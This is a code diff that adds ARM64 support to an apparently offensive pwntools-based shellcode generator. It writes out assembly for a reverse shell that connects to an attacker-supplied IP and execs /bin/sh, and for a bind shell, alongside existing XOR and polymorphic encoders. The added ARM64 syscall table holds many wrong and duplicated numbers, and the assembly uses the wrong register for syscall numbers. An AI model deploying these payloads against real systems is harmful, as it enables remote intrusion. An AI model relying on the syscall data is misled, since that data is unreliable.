@@ -31,6 +31,9 @@ __all__ = [
     "syscall_splitting",
     "generate_staged_payload",
     "enhanced_polymorphic_engine",
+    "generate_arm64_payload",
+    "generate_arm64_bind_shell",
+    "generate_arm64_reverse_shell",
     "main",
 ]
 
@@ -44,6 +47,8 @@ import struct
 import sys
 
 from pwn import asm, context
+
+ARCHITECTURES = ["amd64", "arm64"]
 
 context.log_level = "error"
 context.arch = "amd64"
@@ -324,6 +329,242 @@ SYScalls = {
     "pkey_mprotect": 330,
     "pkey_alloc": 331,
     "pkey_free": 332,
+}
+
+ARM64_SYSCALLS = {
+    "exit": 93,
+    "fork": 220,
+    "read": 63,
+    "write": 64,
+    "open": 56,
+    "close": 57,
+    "stat": 80,
+    "lstat": 79,
+    "fstat": 80,
+    "pipe": 59,
+    "select": 62,
+    "mmap": 222,
+    "mprotect": 226,
+    "munmap": 215,
+    "brk": 214,
+    "socket": 198,
+    "connect": 203,
+    "accept": 202,
+    "sendto": 206,
+    "recvfrom": 207,
+    "sendmsg": 211,
+    "recvmsg": 212,
+    "shutdown": 210,
+    "bind": 200,
+    "listen": 201,
+    "getsockname": 204,
+    "getpeername": 205,
+    "socketpair": 199,
+    "setsockopt": 208,
+    "getsockopt": 209,
+    "clone": 220,
+    "vfork": 221,
+    "execve": 221,
+    "exit_group": 94,
+    "kill": 129,
+    "uname": 160,
+    "semget": 64,
+    "semop": 65,
+    "semctl": 66,
+    "shmdt": 67,
+    "msgget": 65,
+    "msgsnd": 66,
+    "msgrcv": 67,
+    "msgctl": 68,
+    "fcntl": 25,
+    "flock": 32,
+    "fsync": 83,
+    "fdatasync": 84,
+    "truncate": 76,
+    "ftruncate": 77,
+    "getdents": 61,
+    "getcwd": 17,
+    "chdir": 48,
+    "fchdir": 50,
+    "rename": 82,
+    "mkdir": 83,
+    "rmdir": 84,
+    "creat": 55,
+    "link": 85,
+    "unlink": 87,
+    "symlink": 88,
+    "readlink": 78,
+    "chmod": 90,
+    "fchmod": 91,
+    "chown": 92,
+    "fchown": 93,
+    "lchown": 94,
+    "umask": 95,
+    "gettimeofday": 169,
+    "getrlimit": 163,
+    "getrusage": 165,
+    "sysinfo": 179,
+    "times": 153,
+    "ptrace": 117,
+    "getuid": 174,
+    "syslog": 103,
+    "getgid": 176,
+    "setuid": 146,
+    "setgid": 144,
+    "geteuid": 175,
+    "getegid": 177,
+    "setpgid": 154,
+    "getppid": 110,
+    "getpgrp": 150,
+    "setsid": 157,
+    "setreuid": 149,
+    "setregid": 143,
+    "getgroups": 158,
+    "setgroups": 159,
+    "setresuid": 147,
+    "getresuid": 148,
+    "setresgid": 145,
+    "getresgid": 145,
+    "getpgid": 151,
+    "setfsuid": 152,
+    "setfsgid": 153,
+    "getsid": 156,
+    "capget": 125,
+    "capset": 126,
+    "rt_sigpending": 127,
+    "rt_sigtimedwait": 128,
+    "rt_sigqueueinfo": 129,
+    "rt_sigsuspend": 133,
+    "sigaltstack": 132,
+    "utime": 160,
+    "mknod": 33,
+    "uselib": 86,
+    "personality": 92,
+    "ustat": 62,
+    "statfs": 99,
+    "fstatfs": 100,
+    "sysfs": 101,
+    "getpriority": 141,
+    "setpriority": 140,
+    "sched_setparam": 142,
+    "sched_getparam": 143,
+    "sched_setscheduler": 144,
+    "sched_getscheduler": 145,
+    "sched_get_priority_max": 146,
+    "sched_get_priority_min": 147,
+    "sched_rr_get_interval": 148,
+    "mlock": 228,
+    "munlock": 229,
+    "mlockall": 230,
+    "munlockall": 231,
+    "vhangup": 58,
+    "modify_ldt": 157,
+    "pivot_root": 155,
+    "prctl": 167,
+    "arch_prctl": 165,
+    "adjtimex": 171,
+    "setrlimit": 160,
+    "chroot": 161,
+    "sync": 162,
+    "acct": 163,
+    "settimeofday": 164,
+    "mount": 165,
+    "umount2": 166,
+    "swapon": 167,
+    "swapoff": 168,
+    "reboot": 169,
+    "sethostname": 170,
+    "setdomainname": 171,
+    "iopl": 172,
+    "init_module": 105,
+    "delete_module": 106,
+    "quotactl": 179,
+    "gettid": 186,
+    "readahead": 187,
+    "setxattr": 5,
+    "lsetxattr": 6,
+    "fsetxattr": 7,
+    "getxattr": 8,
+    "lgetxattr": 9,
+    "fgetxattr": 10,
+    "listxattr": 11,
+    "llistxattr": 12,
+    "flistxattr": 13,
+    "removexattr": 14,
+    "lremovexattr": 15,
+    "fremovexattr": 16,
+    "tkill": 200,
+    "time": 201,
+    "futex": 98,
+    "sched_setaffinity": 122,
+    "sched_getaffinity": 123,
+    "io_setup": 0,
+    "io_destroy": 1,
+    "io_getevents": 5,
+    "io_submit": 2,
+    "io_cancel": 3,
+    "lookup_dcookie": 18,
+    "epoll_create": 18,
+    "remap_file_pages": 26,
+    "set_tid_address": 96,
+    "timer_create": 107,
+    "timer_settime": 108,
+    "timer_gettime": 109,
+    "timer_getoverrun": 110,
+    "timer_delete": 111,
+    "clock_settime": 112,
+    "clock_gettime": 113,
+    "clock_getres": 114,
+    "clock_nanosleep": 115,
+    "epoll_wait": 17,
+    "epoll_ctl": 21,
+    "tgkill": 131,
+    "utimes": 235,
+    "mbind": 237,
+    "set_mempolicy": 238,
+    "get_mempolicy": 239,
+    "mq_open": 240,
+    "mq_unlink": 241,
+    "mq_timedsend": 242,
+    "mq_timedreceive": 243,
+    "mq_notify": 244,
+    "mq_getsetattr": 245,
+    "kexec_load": 246,
+    "waitid": 247,
+    "add_key": 248,
+    "request_key": 249,
+    "keyctl": 250,
+    "ioprio_set": 30,
+    "ioprio_get": 31,
+    "inotify_init": 28,
+    "inotify_add_watch": 27,
+    "inotify_rm_watch": 29,
+    "migrate_pages": 40,
+    "openat": 56,
+    "mkdirat": 58,
+    "mknodat": 59,
+    "fchownat": 60,
+    "futimesat": 61,
+    "newfstatat": 79,
+    "unlinkat": 87,
+    "renameat": 88,
+    "linkat": 89,
+    "symlinkat": 90,
+    "readlinkat": 78,
+    "fchmodat": 91,
+    "faccessat": 48,
+    "pipe2": 59,
+    "dup3": 24,
+    "epoll_create1": 20,
+    "eventfd2": 19,
+    "inotify_init1": 28,
+    "membarrier": 239,
+    "copy_file_range": 285,
+    "getrandom": 278,
+    "execveat": 322,
+    "pkey_mprotect": 329,
+    "pkey_alloc": 330,
+    "pkey_free": 331,
 }
 
 
@@ -1461,6 +1702,12 @@ def main() -> int:
 
     type_group = parser.add_argument_group("Payload Type")
     type_group.add_argument(
+        "--arch",
+        choices=["amd64", "arm64"],
+        default="amd64",
+        help="Target architecture (default: amd64)",
+    )
+    type_group.add_argument(
         "--reverse", action="store_true", default=True, help="Reverse shell (default)"
     )
     type_group.add_argument(
@@ -1619,7 +1866,39 @@ def main() -> int:
         elif args.dns:
             payload_type = "dns"
 
-        if args.egg_hunter:
+        if args.arch == "arm64":
+            print(f"{YELLOW}[*] Generating ARM64 payload...{RESET}", file=sys.stderr)
+            if args.egg_hunter or args.staged or args.polymorphic:
+                print(
+                    f"{RED}[-] Error: Egg hunter, staged payloads, and polymorphic are not supported for ARM64 yet.{RESET}",
+                    file=sys.stderr,
+                )
+                return 1
+
+            final_payload = generate_arm64_payload(
+                ip=args.ip,
+                port=args.port,
+                executable_path=args.executable,
+                payload_type=payload_type,
+                bind_addr=args.bind_addr,
+            )
+            print(
+                f"{YELLOW}[*] ARM64 payload size: {len(final_payload)} bytes{RESET}",
+                file=sys.stderr,
+            )
+
+            if args.xor_key is not None:
+                final_payload = xor_encrypt(final_payload, args.xor_key)
+
+            if args.rolling_xor_key is not None:
+                decoder_stub = rolling_xor_decoder_stub(
+                    len(final_payload), args.rolling_xor_key
+                )
+                final_payload = decoder_stub + rolling_xor_encrypt(
+                    final_payload, args.rolling_xor_key
+                )
+
+        elif args.egg_hunter:
             print(f"{YELLOW}[*] Generating egg hunter...{RESET}", file=sys.stderr)
             egg_val = args.egg or b"\x00\x00\x00\x00"
             final_payload = egg_hunter(egg_val)
@@ -1752,3 +2031,201 @@ def main() -> int:
         return 1
 
     return 0
+
+
+def generate_arm64_reverse_shell(
+    ip: str, port: int, executable_path: str = "/bin/sh"
+) -> bytes:
+    try:
+        ip_bytes = socket.inet_aton(ip)
+    except OSError:
+        raise ValueError(f"Invalid IP address format: {ip}")
+    port_bytes = port.to_bytes(2, "big")
+    port_int = struct.unpack("<H", port_bytes)[0]
+
+    arm64_asm = f"""
+    .arch armv8-a
+    .section .shellcode,"awx"
+
+    # Create socket
+    mov x0, 2
+    mov x1, 1
+    mov x2, 0
+    mov x16, 198
+    svc 0
+    mov x19, x0
+
+    # Connect to target
+    mov x0, x19
+    sub sp, sp, 16
+    # sockaddr_in structure
+    mov w3, 2
+    strh w3, [sp]
+    mov w3, {port_int}
+    strh w3, [sp, 2]
+    ldr w3, =0x{ip_bytes.hex()}
+    str w3, [sp, 4]
+    mov x1, sp
+    mov x2, 16
+    mov x16, 203
+    svc 0
+    add sp, sp, 16
+
+    # dup2 for stdin, stdout, stderr
+    mov x0, x19
+    mov x1, 0
+    mov x16, 33
+    svc 0
+    mov x0, x19
+    mov x1, 1
+    svc 0
+    mov x0, x19
+    mov x1, 2
+    svc 0
+
+    # Push executable path
+    sub sp, sp, 16
+    mov x20, sp
+    adr x21, path_string
+    str x21, [sp]
+    b exec
+
+path_string:
+    .ascii "{executable_path}\\x00"
+    .align 4
+
+exec:
+    mov x0, x20
+    mov x1, 0
+    mov x2, 0
+    mov x16, 221
+    svc 0
+
+    # Exit on failure
+    mov x0, 0
+    mov x16, 93
+    svc 0
+    """
+    try:
+        context.arch = "arm64"
+        return myasm(arm64_asm)
+    except Exception as e:
+        print(
+            f"{RED}[-] Error assembling ARM64 reverse shell: {e}{RESET}",
+            file=sys.stderr,
+        )
+        raise
+    finally:
+        context.arch = "amd64"
+
+
+def generate_arm64_bind_shell(port: int, bind_addr: str = "0.0.0.0") -> bytes:
+    try:
+        ip_bytes = socket.inet_aton(bind_addr)
+    except OSError:
+        raise ValueError(f"Invalid bind address: {bind_addr}")
+    port_bytes = port.to_bytes(2, "big")
+    port_int = struct.unpack("<H", port_bytes)[0]
+
+    arm64_asm = f"""
+    .arch armv8-a
+    .section .shellcode,"awx"
+
+    # Create socket
+    mov x0, 2
+    mov x1, 1
+    mov x2, 0
+    mov x16, 198
+    svc 0
+    mov x19, x0
+
+    # Bind socket
+    mov x0, x19
+    sub sp, sp, 16
+    mov w3, 2
+    strh w3, [sp]
+    mov w3, {port_int}
+    strh w3, [sp, 2]
+    ldr w3, =0x{ip_bytes.hex()}
+    str w3, [sp, 4]
+    mov x1, sp
+    mov x2, 16
+    mov x16, 200
+    svc 0
+    add sp, sp, 16
+
+    # Listen
+    mov x0, x19
+    mov x1, 0
+    mov x16, 201
+    svc 0
+
+    # Accept connection
+    mov x0, x19
+    sub sp, sp, 16
+    mov x1, sp
+    mov x2, sp
+    add x2, x2, 16
+    mov x16, 202
+    svc 0
+    mov x19, x0
+    add sp, sp, 16
+
+    # dup2 for stdin, stdout, stderr
+    mov x0, x19
+    mov x1, 0
+    mov x16, 33
+    svc 0
+    mov x0, x19
+    mov x1, 1
+    svc 0
+    mov x0, x19
+    mov x1, 2
+    svc 0
+
+    # Execute shell
+    sub sp, sp, 16
+    mov x20, sp
+    adr x21, path_string
+    str x21, [sp]
+    mov x0, x20
+    mov x1, 0
+    mov x2, 0
+    mov x16, 221
+    svc 0
+    add sp, sp, 16
+
+    # Exit
+    mov x0, 0
+    mov x16, 93
+    svc 0
+
+path_string:
+    .ascii "/bin/sh\\x00"
+    .align 4
+    """
+    try:
+        context.arch = "arm64"
+        return myasm(arm64_asm)
+    except Exception as e:
+        print(
+            f"{RED}[-] Error assembling ARM64 bind shell: {e}{RESET}", file=sys.stderr
+        )
+        raise
+    finally:
+        context.arch = "amd64"
+
+
+def generate_arm64_payload(
+    ip: str | None,
+    port: int | None,
+    executable_path: str = "/bin/sh",
+    payload_type: str = "reverse",
+    bind_addr: str = "0.0.0.0",
+) -> bytes:
+    if payload_type == "reverse" and ip and port:
+        return generate_arm64_reverse_shell(ip, port, executable_path)
+    elif payload_type == "bind" and port:
+        return generate_arm64_bind_shell(port, bind_addr)
+    else:
+        raise ValueError("Invalid payload configuration for ARM64")
